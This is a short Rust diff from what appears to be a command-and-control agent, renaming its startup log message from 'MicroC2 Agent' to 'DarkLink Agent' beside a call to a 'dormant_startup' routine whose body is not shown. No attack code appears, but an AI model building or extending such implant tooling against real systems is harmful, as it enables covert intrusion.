@@ -53,7 +53,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     dormant_startup();
 
     env_logger::init();
-    info!("[STARTUP] MicroC2 Agent starting...");
+    info!("[STARTUP] DarkLink Agent starting...");
 
     let config = agent::config::AgentConfig::load()?;
     info!("[CONFIG] Loaded agent config: {:?}", config);
